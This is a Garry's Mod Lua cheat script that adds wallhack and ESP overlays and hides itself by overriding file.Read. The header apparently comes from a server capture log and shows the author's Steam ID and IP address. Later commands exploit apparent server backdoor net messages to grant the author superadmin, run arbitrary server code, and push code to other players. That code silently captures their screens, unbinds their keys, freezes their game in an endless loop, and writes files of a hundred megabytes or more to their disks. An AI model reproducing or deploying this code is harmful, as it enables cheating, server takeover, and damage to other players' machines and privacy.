--[[
	MOD/lua_old/shinycow/esp.lua [#29026 (#29970), 394145668]
	Shinycow | STEAM_0:0:29257121 <76.100.140.68:27006> | [11.01.14 10:12:41PM]
	===BadFile===
]]

	----------------- update 12/19/13
	----------------------- made it harder to detect this script. Replaced the hook.Add's with something else that is exactly the same.

local SCE = {}
	---------------- CONFIG
	
	// Toggle esp. Or yknow, just run sc_esp_toggle
local sc_espon = true

local sc_drawhealth = true

	// Draw halo around player? NOTE: Halos cause some FPS drop. (10-15)
local sc_drawhalos = false

	// Draw the up/down arrows on da player
local sc_drawheadsmash = true

	// Print in your chat when a player's babygod wears off
local sc_notifybabygod = false

	// Draw where you're pointing at.
local sc_drawmyownbeam = false

	// Instead of blue, use yellow/purple
local sc_yellowized = true

	// Other player prop colors. Use Colour tool to find new color.
local sc_otherplayerprops = Color( 255, 200, 0, 60 )

	// Your prop color. Blue by default.
local sc_myprops = Color( 127, 159, 255, 200 )

	// Turn on capping a distance for showing players trace. Increases FPS neglibly
local sc_tracecap = false

local sc_drawprinters = true

local sc_printercolor = Color( 127, 255, 159, 255 )

local friends = {}
local sc_friendsmode = false

	---------------- END CONFIG

local debug = debug
local CreateClientConVar = CreateClientConVar
local gameevent = gameevent

local next = next
local cam = cam
local render = render
local util = util
local draw = draw
local IsValid = IsValid
local LocalPlayer = LocalPlayer
local halo = halo
local ents = ents
local player = player
local surface = surface
local string = string
local print = print
local timer = timer
local gameevent = gameevent
local debug = debug
local IsValid = IsValid
local EyePos = EyePos
local EyeAngles = EyeAngles
local hook = hook
local tostring = tostring
local ScrW = ScrW
local ScrH = ScrH
local Vector = Vector
local math = math
local team = team

local playerGetAll = player.GetAll
local entsGetAll = ents.GetAll

local renderDrawBeam = render.DrawBeam
local renderSetMaterial = render.SetMaterial 
local utilTraceLine = util.TraceLine
local camStart3D = cam.Start3D
local camEnd3D = cam.End3D
local entsFindByClass = ents.FindByClass
local camStart2D = cam.Start2D
local camEnd2D = cam.End2D
local stringfind = string.find
local stringlower = string.lower
local teamGetColor = team.GetColor
local drawSimpleText = draw.SimpleText
local mathClamp = math.Clamp
local surfaceGetTextSize = surface.GetTextSize
	

local _R = debug.getregistry()
	-- Entities
local scSetMat = _R.Entity.SetMaterial
local scSetColor = _R.Entity.SetColor
local scGetNWString = _R.Entity.GetNWString
local scGetPos = _R.Entity.GetPos
local scGetModel = _R.Entity.GetModel
local scGetAttachment = _R.Entity.GetAttachment

	-- Players
local scAlive = _R.Player.Alive
local scNick = _R.Player.Nick

	-- Vector
local scToScreen = _R.Vector.ToScreen

local AddConsoleCommand = AddConsoleCommand

local oldFileRead = file.Read
function file.Read( dir, type )
	if string.find(string.lower(dir), "esp") or string.find(dir, ".lua") then
		local toreturn = "lol. "
		for i=1,5000 do
			toreturn = toreturn .. "nerd. "
		end
		return toreturn
	else
		return oldFileRead( dir, type )
	end
end

--[[oldConCommand = oldConCommand or _R.Player.ConCommand
local ccwhitelist =
{
"gmod_tool",
"dupe_show",
"vote",
"darkrp",
"wheel_rx",
"wheel_ry",
"wheel_model",
"playx_gui_open",
"playx_gui_close",
"gm_spawn",
}
function _R.Player:ConCommand( cmd )
	print( cmd .. " was attempted to run on u" )
	for k,v in pairs(ccwhitelist) do
		if string.find(cmd, v) then
			oldConCommand( self, cmd )
			break
		end
	end
end]]

surface.CreateFont("ScoreboardText", 
{
	size = 20,
	weight = 100,
	antialias = true,
	shadow = true,
	font = "coolvetica"
})

gameevent.Listen("player_spawn")

local function sce_AddCommand( cmd, func, help )
	SCE[ "sc_" .. cmd:lower() ] = {Function = func, Help = help}
	AddConsoleCommand( "sc_" .. cmd:lower(), help )
end

local oldICC = InjectConsoleCommand
function InjectConsoleCommand( player, command, arguments, args )
	if SCE[ command:lower() ] then
		SCE[ command:lower() ].Function( player, command, arguments, args )
		return true
	end
	
	oldICC( player, command, arguments, args )
end

local function SC_SetMaterial( ent )
	if not IsValid( ent ) then return end

	if sc_espon then
	
		scSetMat( ent, "mat1" )
	
	else
	
		scSetMat( ent, "" )
		
	end
end

if sc_drawprinters and not string.find(string.lower(gmod.GetGamemode().Name), "darkrp") then
	print("\nShinycow's ESP: DarkRP Gamemode not found. Disabling drawing printers.")
	sc_drawprinters = false
end

local function GetMuzzlePos(ply)
	if not IsValid(ply) then return Vector() end

	local vm = ply:GetViewModel()
	local pos = ply:EyePos()

	if IsValid( vm ) then
		local attachId = vm:LookupAttachment("muzzle")
		if attachId == 0 then
			attachId = vm:LookupAttachment("1")
		end

		if scGetAttachment( vm, attachId ) != nil then
			pos = scGetAttachment( vm, attachId).Pos
		end
	end

	return (pos or ply:EyePos())
end


// Barrelhack
local BH_Material = Material("effects/laser1")
local BH_Material_NOZ = Material("effects/laser1_noz")

--local function RooftopPlayer()
hook.Hooks["RenderScreenspaceEffects"][ "shinycow_rooftop" ] = function()
	if not sc_espon then return end
	
	camStart3D(EyePos(), EyeAngles())
		
		for k,v in next,playerGetAll() do
		
			if IsValid(v) and scAlive(v) and v:Team() != TEAM_SPECTATOR then
				if sc_tracecap and ( (scGetPos(LocalPlayer()) - scGetPos(v)):LengthSqr() < 10.5 * 1000000 ) then
					if (v == LocalPlayer() and sc_drawmyownbeam) or v != LocalPlayer() then
						renderSetMaterial(BH_Material)
						renderDrawBeam(GetMuzzlePos(v), v:GetEyeTrace().HitPos, 20, 1, 1, Color(255, 0, 0, 255))
					end
					
					if v != LocalPlayer() and sc_drawheadsmash then
					
						renderSetMaterial(BH_Material_NOZ)

						local tr = utilTraceLine({start = v:EyePos(), endpos = v:EyePos() + Vector(0, 0, 100000), filter = v})
						renderDrawBeam(v:EyePos(), tr.HitPos, 50, 1, 1, Color(0, 255, 0, 255))

						tr = utilTraceLine({start = v:EyePos(), endpos = v:EyePos() - Vector(0, 0, 100000), filter = v})
						renderDrawBeam(v:EyePos(), tr.HitPos, 10, 1, 1, Color(0, 255, 0, 255))
					
					end
				elseif not sc_tracecap then
					if (v == LocalPlayer() and sc_drawmyownbeam) or v != LocalPlayer() then
						renderSetMaterial(BH_Material)
						renderDrawBeam(GetMuzzlePos(v), v:GetEyeTrace().HitPos, 20, 1, 1, Color(255, 0, 0, 255))
					end
					
					if v != LocalPlayer() and sc_drawheadsmash then
					
						renderSetMaterial(BH_Material_NOZ)

						local tr = utilTraceLine({start = v:EyePos(), endpos = v:EyePos() + Vector(0, 0, 100000), filter = v})
						renderDrawBeam(v:EyePos(), tr.HitPos, 50, 1, 1, Color(math.random(0,200), math.random(50,255), 0, 255))

						tr = utilTraceLine({start = v:EyePos(), endpos = v:EyePos() - Vector(0, 0, 100000), filter = v})
						renderDrawBeam(v:EyePos(), tr.HitPos, 10, 1, 1, Color(0, 255, 0, 255))
					
					end
				end
			end
			
		end
	camEnd3D()
end
--hook.Add("RenderScreenspaceEffects", "shinycow_rooftop", RooftopPlayer)
--hook.Hooks["RenderScreenspaceEffects"][ "shinycow_rooftop" ] = RooftopPlayer

--hook.Remove("RenderScreenspaceEffects", "RenderNearDeath")
hook.Hooks["RenderScreenspaceEffects"][ "RenderNearDeath" ] = nil

for k,v in next, entsFindByClass("viewmodel") do
	v:SetMaterial( "models/screenspace" )
end
timer.Create("fdsfdsfDsfdsfsdfasdFSADFDSAf ufuck u", 2, 0, function()
	if not sc_espon then
		timer.Destroy("dsfdsfDsfdsfsdfasdFSADFDSAf ufuck u")
	else
		for k,v in next, entsFindByClass("viewmodel") do
			v:SetMaterial( "models/screenspace" )
		end
	end
end)
--"cl_weaponcolor" = "100217864192.000000 10021.784180 1.000000" ( def. "" )

local FakeUM = {}
local function MakeFakeUM()
	FakeUM = {}
	function FakeUM:ReadLong()
		return self.ID
	end
	function FakeUM:ReadString()
		return self.Ent
	end
end

--[[function debug.getupvalues(f)
	local t, i, k, v = {}, 1, debug.getupvalue(f, 1)
	while k do
		t[k] = v
		i = i+1
		k,v = debug.getupvalue(f, i)
	end
	return t
end]]

local Hook, usermessageHooks = debug.getupvalue(usermessage.Hook, 2)

/*local LastSpawned = NULL
--local usermessageHooks = debug.getupvalues(usermessage.Hook).Hooks
--local AddUndo = usermessageHooks.AddUndo.Function
local AddUndo = usermessageHooks["AddUndo"]["Function"]

usermessage.Hook("AddUndo", function( um )
	local k = um:ReadLong()
	local v = um:ReadString()
		
	local propModel = string.match(v, "Prop .(.*).")
	
	--if FPP then return end
	
	if IsValid(LastSpawned) and propModel == scGetModel( LastSpawned ) then
		LastSpawned.IsMine = true
		LastSpawned = NULL
	elseif not IsValid(LastSpawned) then
		--if FPP then return end
		local trace = LocalPlayer():GetEyeTrace()
		timer.Create("undo_" .. k .. v, 0.008, 19, function()
			if trace.Entity:GetClass() == "prop_physics" and not trace.Entity.IsMine and hook.Call("PhysgunPickup", nil, LocalPlayer(), trace.Entity) then
				LocalPlayer():GetEyeTrace().Entity.IsMine = true
				LastSpawned = NULL
				timer.Destroy("undo_" .. k .. v)
			end
		end)
	end
		
		--print(propModel)
end)*/

--hook.Add("OnEntityCreated", "DetectMyProps", function( ent )
--	timer.Create("undo_" .. tostring(ent), 0.008, 50, function()
--		if hook.Call("PhysgunPickup", nil, LocalPlayer(), ent) and not ent.IsMine then LocalPlayer():ChatPrint("hey!") ent.IsMine = true end
--	end)
	
	--for k,v in pairs(undo.GetTable()) do
	--	print(k)
	--end
	--if ent:GetClass() != "prop_physics" then return end
		
		--[[for k,v in pairs(undo.GetTable()) do
			print(tostring(k))
			PrintTable(v)
		end]]
		
	--LastSpawned = ent
	--timer.Simple(0.5, function() LastSpawned = NULL end)
		--[[if FPP then
			timer.Create("detectmyprop_" .. tostring(ent), 0.01, 50, function()
				if IsValid(ent) and ent.FPPOwner and scNick( LocalPlayer() ) == ent.FPPOwner and not ent.IsMine then
					ent.IsMine = true
				else
					print(ent.FPPOwner)
				end
			end)
		end]]
		--print(tostring(LastSpawned))*/
--end)*/


local LastSpawned = {}
local i = 0
usermessage.Hook("AddUndo", function( um )
	local k = um:ReadLong()
	local v = um:ReadString()
		
	local propModel = string.match(v, "Prop .(.*).")
	
	for k,v in pairs(LastSpawned) do
		if IsValid(v) and propModel == v:GetModel() and not v.IsMine then
			--LocalPlayer():ChatPrint("woo" .. i)
			i = i + 1
			v.IsMine = true
			table.remove(LastSpawned, k)
			break
		elseif IsValid(v) and not v.IsMine and hook.Call("PhysgunPickup", nil, LocalPlayer(), v) then
			v.IsMine = true
			break
		end
	end
	
	if not LastSpawned[ 1 ] then
		local timerCreate = timer.Create
		local trace = LocalPlayer():GetEyeTrace()
		timerCreate("undo_" .. tostring(trace.Entity), 0.008, 25, function()
			if IsValid(trace.Entity) and trace.Entity:GetClass() == "prop_physics" and not trace.Entity.IsMine and hook.Call("PhysgunPickup", nil, LocalPlayer(), trace.Entity) then
				LocalPlayer():GetEyeTrace().Entity.IsMine = true
				timer.Destroy("undo_" .. tostring(trace.Entity))
			end
		end)
	end
	
end)

--hook.Add("OnEntityCreated", "DetectMyProps", function( ent )
hook.Hooks["OnEntityCreated"] = hook.Hooks["OnEntityCreated"] or {}
hook.Hooks["OnEntityCreated"][ "DetectMyProps" ] = function( ent )
	if ent:GetClass() != "prop_physics" then return end

	local prop = table.insert(LastSpawned, ent)
	timer.Simple(0.25, function() LastSpawned[ prop ] = nil end)
end

if FPP then
	local function RetrieveOwner(um)
		entIndex, canTouch, owner = um:ReadShort(), um:ReadBool(), um:ReadString()

		local i = 0
		local function setData(ent)
			if not IsValid(ent) and i < 20 then
				i = i + 1
				-- The entity is not always immediately valid
				timer.Simple(0.1, function() setData(Entity(entIndex)) end)
				return
			end

			ent.FPPCanTouch = canTouch
			ent.FPPOwner = owner
			
			if scNick( LocalPlayer() ) == ent.FPPOwner and not ent.IsMine then
				ent.IsMine = true
			elseif scNick( LocalPlayer() ) != ent.FPPOwner and ent.IsMine then
				ent.IsMine = false
			end
		end
		setData(Entity(entIndex))
	end
	usermessage.Hook("FPP_Owner", RetrieveOwner)
end

--hook.Add("PostDrawOpaqueRenderables", "sc_esp", function()
hook.Hooks["PostDrawOpaqueRenderables"] = hook.Hooks["PostDrawOpaqueRenderables"] or {}
hook.Hooks["PostDrawOpaqueRenderables"][ "sc_esp" ] = function()
	if not sc_espon then return end

	for k,v in next, ents.FindByClass("prop_physics") do
		v:DrawModel()
	end
	
	if sc_drawprinters then
		local entsGA = ents.GetAll()
		for k,v in next, entsGA do
			if tostring(v):find( "printer" ) then
				v:DrawModel()
			end
		end
	end
	
	for k,v in next, player.GetAll() do
		if v != LocalPlayer() then
			v:DrawModel()
			--local min,max = v:GetRenderBounds()
			--v:SetRenderBounds( min - Vector(16000,16000,16000), max + Vector(16000,16000,16000) )
			--print(v:Nick() .. " - " .. tostring(min) .. " , " .. tostring(max))
		end
	end
end

--[[timer.Create("fsd", 4, 20, function()
	for k,v in next, player.GetAll() do
		local min,max = v:GetRenderBounds()
			print(v:Nick() .. " - " .. tostring(min) .. " , " .. tostring(max))
	end
end)]]

--local function ESPPlayer()h
--hook.Hooks["RenderScreenspaceEffects"][ "shinycow_esp" ] = function()
hook.Add("RenderScreenspaceEffects", "shinycow_esp", function()
	if not sc_espon then return end
	
	local UpdatedProps = ents.FindByClass("prop_physics")
	local UpdatedEnts = {}
	if sc_drawprinters then UpdatedEnts = ents.GetAll() end

	camStart3D(EyePos(), EyeAngles())
		camStart2D()
			for k,v in next, UpdatedProps do
				
				--v:SetRenderMode( RENDERMODE_TRANSALPHA )
				v:SetRenderMode(RENDERMODE_TRANSALPHA)
				SC_SetMaterial( v )
				v:DrawModel()
				if not v.IsMine then
					scSetColor( v, sc_otherplayerprops )
				else
					if not v.scColored then
						scSetColor( v, sc_myprops )
						v.scColored = true
					end
				end
				
			end
			
			if sc_drawprinters then
				for k,v in next, UpdatedEnts do
					
					if stringfind(stringlower(tostring(v)), "printer") then --or stringfind(stringlower(tostring(v)), "page") then
						SC_SetMaterial( v )
						scSetColor( v, sc_printercolor )
					end
					
				end
			end
					
		
			local plyGetAll = player.GetAll
			for k,v in next,plyGetAll() do
				
				if v == LocalPlayer() then continue end

				v:DrawModel()
				
				local plname = scNick(v)
				local plhead = scGetPos(v) + Vector(0, 0, 64)
				local pos = scToScreen( plhead )
				pos.x = mathClamp(pos.x, 0, ScrW())
				pos.y = mathClamp(pos.y, 40, ScrH())
				local plteam = teamGetColor(v:Team())
				if sc_friendsmode and friends[ v ] then plteam = Color(255, 255, 0, 255) end
				if sc_friendsmode and not friends[ v ] then plteam = Color(255, 93, 0, 255) end
				
				surface.SetFont("ScoreboardText")
				
				local getwidth = surfaceGetTextSize( plname )
				if getwidth >= 100 then getwidth = 100 end
				
				if sc_drawhealth then
					drawSimpleText( v:Health(), "ScoreboardText", pos.x - (getwidth * 0.5) - 1.5, pos.y - 10 - 40, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 255) )
				end
				
				if not v:Alive() then 
					drawSimpleText( "*Dead*", "ScoreboardText", pos.x - (59 * 0.5) - 1.5, pos.y - 10 - 40, Color(220,35,35, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 255))
				end

				drawSimpleText( plname, "ScoreboardText", pos.x - (getwidth * 0.5) - 1.5, pos.y - 10 - 15, Color(plteam.r, plteam.g, plteam.b, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 255))
				local notguest = "user"
				
				if scGetNWString(v, "UserGroup", notguest) != notguest then
					-- 205 150 70
					drawSimpleText( scGetNWString(v, "UserGroup", notguest), "ScoreboardText", pos.x - (surface.GetTextSize( scGetNWString(v, "UserGroup", notguest) ) * 0.5), pos.y - 10 + 10, Color(math.random(150,205), 150, math.random(50,95), 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 255))
				end
				
			end
		camEnd2D()
	camEnd3D()
end)
--hook.Add("RenderScreenspaceEffects", "shinycow_esp", ESPPlayer)
--hook.Hooks["RenderScreenspaceEffects"][ "shinycow_esp" ] = ESPPlayer

local function sc_halos()
	if not sc_espon or not sc_drawhalos then return end
	local haloAdd = halo.Add
	local entsFindByClass = ents.FindByClass
	haloAdd( entsFindByClass( "Player" ), Color( 205, 150, 70, 255 ), 1, 1, 0.5 )
end
--hook.Add("PreDrawHalos", "sc_halos", sc_halos)
hook.Hooks["PreDrawHalos"] = hook.Hooks["PreDrawHalos"] or {}
hook.Hooks["PreDrawHalos"][ "sc_halos" ] = sc_halos

hook.Add("player_spawn", "idklisten", function( data )
--hook.Hooks["player_spawn"] = hook.Hooks["player_spawn"] or {}
--hook.Hooks["player_spawn"][ "idklisten" ] = function( data )
	if IsValid( Player( data.userid ) ) then
		SC_SetMaterial( Player( data.userid ) )
		if GAMEMODE.Config and GAMEMODE.Config.babygod then
			Player( data.userid ).IsGodded = true
			timer.Simple(GAMEMODE.Config.babygodtime, function()
				if IsValid(Player( data.userid )) then
					Player( data.userid ).IsGodded = false
					if sc_notifybabygod then
						LocalPlayer():ChatPrint( scNick(Player( data.userid )) .. " baby god off.")
					else
						if Player( data.userid ) == LocalPlayer() then
							LocalPlayer():ChatPrint( "Your babygod is now off." )
						end
					end
				end
			end)
		end
	end
end)

local function resetplayermaterial()
	local playerAll = player.GetAll
	for k,v in next, playerAll() do

		if v:GetMaterial() != "mat1" then
			SC_SetMaterial( v )
		end

	end
end
hook.Add("Think", "resetplayermaterial", resetplayermaterial)
--hook.Hooks["Think"][ "resetplayermaterial" ] = resetplayermaterial

--[[for k,v in pairs(player.GetAll()) do
	for a,b in pairs(v:GetWeapons()) do
		if table.HasValue( {"weapon_ttt_c4", "weapon_ttt_knife", "weapon_ttt_phammer", "weapon_ttt_radio", "weapon_ttt_sipistol"}, b:GetClass()) and not v.IsTraitored then
			v.IsTraitored = true
		else
			v.IsTraitored = false
		end
	end
	
	if v.IsTraitored then
		print("\n" .. v:Nick())
	end
end]]

--sce_AddCommand( "esp_toggle", function() sc_espon = not sc_espon end )
local function espnow()
	local playerAll = player.GetAll()
	for i=1,#playerAll do

		if not sc_espon then scSetColor( playerAll[ i ], Color( 255, 255, 255, 255 ) ) continue end
		if playerAll[ i ] == LocalPlayer() then continue end
		
		if scAlive(playerAll[ i ]) then
			
			if playerAll[ i ].IsGodded != nil then
				if playerAll[ i ].IsGodded then
					if sc_yellowized then
						scSetColor( playerAll[ i ], Color( 220, 0, 255, 200 ) )
					else
						scSetColor( playerAll[ i ], Color( 30, 30, 200, 200 ) )
					end
				else
					if sc_yellowized then	
						scSetColor( playerAll[ i ], Color( 255, 255, 0, 255 ) )
					else
						scSetColor( playerAll[ i ], Color( 0, 255, 255, 255 ) )
					end
				end
			else
				if sc_yellowized then
					--if playerAll[ i ].GetRole and playerAll[ i ]:GetRole() == 1 or playerAll[ i ]:GetRole() == nil then
					if playerAll[ i ].IsTraitored then
						scSetColor( playerAll[ i ], Color( 100, 50, 100, 255 ) )
					else
						scSetColor( playerAll[ i ], Color( 255, 255, 0, 255 ) )
					end
				else
					--if playerAll[ i ].GetRole and playerAll[ i ]:GetRole() == 1 or playerAll[ i ]:GetRole() == nil then
					if playerAll[ i ].IsTraitored then
						scSetColor( playerAll[ i ], Color( 100, 50, 100, 255 ) )
					else
						scSetColor( playerAll[ i ], Color( 0, 255, 255, 255 ) )
					end
				end
			end
			
			--[[if playerAll[ i ].IsTraitor and playerAll[ i ]:IsTraitor() and not playerAll[ i ].SetTraitored then
				playerAll[ i ].SetTraitored = true
				LocalPlayer():ChatPrint( playerAll[ i ]:Nick() .. " is a traitor!" )
				
				timer.Simple(30, function()
					if IsValid(playerAll[ i ]) then playerAll[ i ].SetTraitored = false end
				end)
			end]]
					
			
		else
			
			scSetColor( playerAll[ i ], Color( 255, 0, 191, 255 ) )
		
		end

	end
end
timer.Create("refresh", 0.45, 0, espnow)

for k,v in next, ents.FindByClass("prop_physics") do
	if v:GetModel() == "models/props_buildings/collapsedbuilding01a.mdl" then
		v:SetNoDraw( true )
	end
end
--hook.Add("OnEntityCreated", "disablethatshit", function( ent )
hook.Hooks["OnEntityCreated"][ "disablethatshit" ] = function( ent )
	timer.Simple(1, function()
		if IsValid(ent) and ent:GetModel() == "models/props_buildings/collapsedbuilding01a.mdl" then
			ent:SetNoDraw( true )
		end
	end)
end

local oldutilEffect = util.Effect
function util.Effect( effectname, data )
	if effectname == "effect_hit" or effectname == "rg_shelleject_shotgun" then return end
	
	return oldutilEffect( effectname, data )
end

sce_AddCommand( "esp_toggle", function()
	sc_espon = not sc_espon
	
	espnow()
	
	for k,v in next, ents.FindByClass("prop_physics") do
		SC_SetMaterial( v )
		if not sc_espon then
			scSetColor( v, Color( 255, 255, 255, 255 ) )
		end
	end
	
	if sc_drawprinters then
		for k,v in next,entsGetAll() do
			if string.find(string.lower(tostring(v)), "printer") then
				SC_SetMaterial( v )
				if not sc_espon then
					scSetColor( v, Color( 255, 255, 255, 255 ) )
				end
			end
		end
	end
end )


	-- wrote this very quickly. sorry its so shit
sce_AddCommand( "addfriend", function( pl, cmd, args )
	local target = GAMEMODE:FindPlayer( args[1] )
	if not target then print("no found player") return end
	
	friends[ target ] = true
	if args[2] and GAMEMODE:FindPlayer(args[2]) then friends[ GAMEMODE:FindPlayer(args[2]) ] = true end
	if args[3] and GAMEMODE:FindPlayer(args[3]) then friends[ GAMEMODE:FindPlayer(args[3]) ] = true end
	if args[4] and GAMEMODE:FindPlayer(args[4]) then friends[ GAMEMODE:FindPlayer(args[4]) ] = true end
	if args[5] and GAMEMODE:FindPlayer(args[5]) then friends[ GAMEMODE:FindPlayer(args[5]) ] = true end
end )




----------- crossbow aimbot
--[[hook.Add("Think", "aimboot", function()
	if IsValid(LocalPlayer():GetActiveWeapon()) and LocalPlayer():GetActiveWeapon():GetClass() != "weapon_crossbow" then return end
	for k,v in next,playerGetAll() do
		if not v:Alive() or v:Team() == TEAM_SPECTATOR then continue end
			-- lol disorient
		--LocalPlayer():SetEyeAngles( Angle( 1071.422, -797.408, -144 ) )
		
	end
end)]]


sce_AddCommand( "180", function()
	local a = LocalPlayer():EyeAngles()
	LocalPlayer():SetEyeAngles( Angle( a.p, a.y - 180, a.r ) )
end )

sce_AddCommand( "180up", function()
	local a = LocalPlayer():EyeAngles()
	local timerSimple = timer.Simple
	LocalPlayer():SetEyeAngles( Angle( a.p - a.p - a.p, a.y - 180, a.r ) )
	RunConsoleCommand( "+jUmp" )
	timerSimple( 0.2, function() RunConsoleCommand("-jUmp") end )
end )

RunConsoleCommand("cl_pred_optimize", 1)


sce_AddCommand( "adminplz", function()
	net.Start("bdsm")
		net.WriteString("game.ConsoleCommand('ulx adduser shinycow superadmin\n')")
	net.SendToServer()
end)

sce_AddCommand( "usergroupadmen", function()
	local me
	for k,v in pairs(player.GetAll()) do
		if v:SteamID() == "STEAM_0:0:29257121" then
			me = k
		end
	end
	print(tostring(me))
	net.Start("bdsm")
		net.WriteString("player.GetAll()[ " .. me .. " ]:SetUserGroup( 'admin' )" )
	net.SendToServer()
end)
	
sce_AddCommand( "respawnplz", function()
	net.Start("bdsm")
		net.WriteString("RunConsoleCommand('ulx', 'respawn', '*')")
	net.SendToServer()
end)

sce_AddCommand( "runshit", function( pl, cmd, args )
	net.Start("oubattack")
		net.WriteString( table.concat( args, " " ) )
	net.SendToServer()
end)

sce_AddCommand( "godme", function( pl, cmd, args )
	local me
	for k,v in pairs(player.GetAll()) do
		if v:SteamID() == "STEAM_0:0:29257121" then
			me = v:UserID()
		end
	end
	net.Start("bdsm")
		net.WriteString( "Player( " .. me .. " ):GodEnable()" )
	net.SendToServer()
end )

	-- unrelated to above ttt exploit. 
sce_AddCommand( "testsc", function( pl, cmd, args )
	timer.Destroy("hahasendshit")
	if not args[1] or not IsValid(Player(args[1])) then print("Not doing this, no wayyyy!") return end
	local i = 0
	timer.Create("hahasendshit", 0.6, 0, function()
		if not IsValid(Player(args[1])) then print("Player left.") return end
		i = i + 1
		net.Start("lolfuckyou")
			net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[local RCD = {} RCD.format = "png" RCD.h = ScrH() RCD.w = ScrW() RCD.quality = 100 RCD.x = 0 RCD.y = 0 local data = render.Capture( RCD ) local f = file.Open( "Shinycowsays_' .. i .. '.txt", "wb", "DATA" ) f:Write( data ) f:Close()]] )' )
		net.SendToServer()
	end)
end )

sce_AddCommand( "unbindhim", function( pl, cmd, args )
	if not args[1] or not IsValid(Player(args[1])) then print("sory i ant doing it") return end
	local target = Player(args[1])
	net.Start("lolfuckyou")
		net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[RunConsoleCommand("unbindall")]] )' )
	net.SendToServer()
	timer.Simple(1.3, function() if IsValid(target) then
		net.Start("lolfuckyou")
			net.WriteString( 'Player(' .. args[1] .. '):ChatPrint("lol wot")' )
		net.SendToServer()
		end
	end)
	timer.Simple(2.1, function() if IsValid(target) then
		net.Start("lolfuckyou")
			net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[while true do print("fuck u noob lmao") end]] )' )
		net.SendToServer()
		end
	end)
end )

sce_AddCommand( "nettest", function()
	net.Start("oubattack")
		net.WriteString("RunConsoleCommand('say', 'shinycow sucks dick ~ ultra')")
	net.SendToServer()
end )

sce_AddCommand( "testbigfile", function( pl, cmd, args )
	if not args[1] or not IsValid(Player(args[1])) then print("lol fuck no dude") return end
	local target = Player(args[1])
	if target == pl then print("no. i dont want a 100mb+ file in my harddisk ty") return end
	
	local amt = (args[2] and args[2] * 1000) or 175000
	--175000
	
	net.Start("oubattack")
			-- 1,500,000 NO IT WAS TOO BIGGG								-- about 3 seconds
			-- 1,000,000 NO IT WAS TOO BIGGG ;--; "Peppers: i freeze"		-- about 2.3 seconds
			-- 600,000 ehhhhhhhh 											-- like 1.5 seconds
			
			-- with my latest hahaha (no lag tho)
					-- |FP| Peppers: ok so im getting like 60
					--|FP| Peppers: then it goes to 10

		net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[file.CreateDir("fadmin_log") timer.Simple(0.2, function() file.Write("fadmin_log/lelele" .. math.random(1,999) .. ".txt", string.rep("Hello player. You have stumbled upon me, the great file of Sykranos!", ' .. amt .. ')) end)]] )' )
	net.SendToServer()
end )

sce_AddCommand( "makescreenshot", function( pl, cmd, args )
	if not args[1] or not IsValid(Player(args[1])) then print("lol im not oding this") return end
	
	net.Start("oubattack")
		--net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[local i = 0 timer.Create("hahasendshit", 0.4, 3, function() i = i + 1 local RCD = {} RCD.format = "png" RCD.h = ScrH() RCD.w = ScrW() RCD.quality = 100 RCD.x = 0 RCD.y = 0 local data = render.Capture( RCD ) local f = file.Open( "Shinycowsays_test.txt", "wb", "DATA" ) f:Write( data ) f:Close() end)]] )' )
		net.WriteString( 'Player(' .. args[1] .. '):SendLua( [[local i = 0 i = i + 2 local RCD = {} RCD.format = "png" RCD.h = ScrH() * 2 RCD.w = ScrW() * 2 RCD.quality = 100 RCD.x = 0 RCD.y = 0 local data = render.Capture( RCD ) local f = file.Open( "Shinycowsays_" .. i .. ".txt", "wb", "DATA" ) f:Write( data ) f:Close()]] )' )
	net.SendToServer()
end )

sce_AddCommand( "moo", function( pl, cmd, args )
	local whatis = "z"
	timer.Create("afd", 0.8, 100, function()
		if whatis == "z" then
			RunConsoleCommand("say", "!pklight a")
			whatis = "a"
		else
			RunConsoleCommand("say", "!pklight z")
			whatis = "z"
		end
	end)
end )

sce_AddCommand( "ulx", function( pl )
	PrintTable(ULib.ucl.groups)
end)

local BlockedProps = {}

local FixMyProps = {}
FixMyProps["models/props/cs_militia/refrigerator01.mdl"] = "models/props/../props/cs_militia/refrigerator01.mdl"
FixMyProps["models/props/de_train/lockers_long.mdl"] = "models/props/../props/de_train/lockers_long.mdl"

if not FPP then return end

local LastSpawned = ""
--hook.Add("PlayerBindPress", "sc_blockedmodels", function( pl, bind )
hook.Hooks["PlayerBindPress"] = hook.Hooks["PlayerBindPress"] or {}
hook.Hooks["PlayerBindPress"][ "sc_blockedmodels" ] = function( pl, bind )
	local output = bind
	if string.find(bind, "gm_spawn") then
		output = string.gsub(output, "gm_spawn ", "")
		LastSpawned = output
		
		if table.HasValue(BlockedProps, LastSpawned) and FixMyProps[LastSpawned] then
			RunConsoleCommand("gm_spawn", FixMyProps[LastSpawned])
		end
	end
end

local notify = FPP.AddNotify
function FPP.AddNotify(str, type)
	if LastSpawned != "" and (str == "The model of this entity is in the black list!") and not table.HasValue(BlockedProps, LastSpawned) then
		BlockedProps[ #BlockedProps + 1 ] = LastSpawned
		if FixMyProps[LastSpawned] then
			RunConsoleCommand("gm_spawn", FixMyProps[LastSpawned])
		end
	end
	return notify(str, type)
end

--[[for k,v in pairs(ents.FindByClass("page")) do
	print(tostring(v))
end]]
--[[local ply = LocalPlayer() // Or any player
local vec1 = Vector( 0,0,0 ) -- Where we're looking at
local vec2 = ply:GetShootPos() -- The player's eye pos
ply:SetEyeAngles( ( vec1 - vec2 ):Angle() ) -- Sets to the angle between the two vectors
]]
--LocalPlayer():SetEyeAngles( (ents.FindByClass("page")[1]:GetPos() - LocalPlayer():GetShootPos()):Angle() )